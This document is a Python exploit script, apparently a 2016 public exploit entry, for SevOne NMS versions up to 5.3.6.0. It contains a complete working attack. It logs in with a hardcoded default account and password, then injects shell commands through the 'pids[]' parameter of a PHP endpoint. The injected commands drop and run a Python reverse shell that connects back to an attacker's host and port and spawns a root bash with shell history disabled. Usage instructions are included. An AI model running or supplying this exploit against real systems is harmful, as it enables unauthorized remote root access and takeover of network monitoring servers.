 
# Exploit Title: SevOne NMS <= 5.3.6.0 reverse shell remote root
# Date: 01/14/2016
# Exploit Author: @iamsecurity
# Vendor Homepage: https://www.sevone.com/
# Software Link: https://www.sevone.com/download2/free/vimage/SevOne-Download.ova
# Version: 5.3.6.0
"""sevone.py: Simple reverse root shell exploit for SevOne <= 5.3.6.0.
Details: http://russiansecurity.expert/2016/01/14/critical-security-issues-in-sevone-nms/
run: ./sevone.py "sevone_url" lhost lport
"""
 
import sys
import requests
 
__author__ = &#039;@iamsecurity&#039;
 
 
def main():
    if len(sys.argv) < 4:
        print(&#039;Enter url of SevOne PAS server and listen IP and PORT to connect back.\nUsage: &#039; + sys.argv[0] +
              &#039; "sevone_url" lhost lport\nExample: ./sevone.py http://192.168.1.104 192.168.1.105 31337&#039;)
        sys.exit(1)
    requests.packages.urllib3.disable_warnings()
    url = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]
    login_url = url + "/doms/login/processLogin.php"
    rce_url = url + "/doms/discoveryqueue/kill.php"
    login = "SevOneStats"
    password = "n3v3rd13"
    s = requests.Session()
    s.verify = False
    payload = [
        &#039;`echo \&#039;import os; import pty; import socket; lhost="&#039;+lhost+&#039;"; lport=&#039;+lport+&#039;; s=socket.socket(socket.AF_IN&#039;
        &#039;ET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fi&#039;
        &#039;leno(),2); os.putenv("HISTFILE","/dev/null"); pty.spawn("/bin/bash"); s.close()\&#039; | dd of=/tmp/sess_ap6k1d1ucb&#039;
        &#039;etfk9fhcqdnk0be5`&#039;,
        &#039;`python /tmp/sess_ap6k1d1ucbetfk9fhcqdnk0be5; rm -rf /tmp/sess_ap6k1d1ucbetfk9fhcqdnk0be5`&#039;
    ]
    s.post(login_url, {&#039;login&#039;: login, &#039;passwd&#039;: password, &#039;tzString&#039;: 1})
    s.post(rce_url, {&#039;pids[]&#039;: payload[0]})
    try:
        s.post(rce_url, {&#039;pids[]&#039;: payload[1]}, timeout=0.001)
    except requests.exceptions.ReadTimeout:
        print("Don&#039;t need wait for response from server. Exploit successfully!")
        pass
 
 
if __name__ == "__main__":
    main()

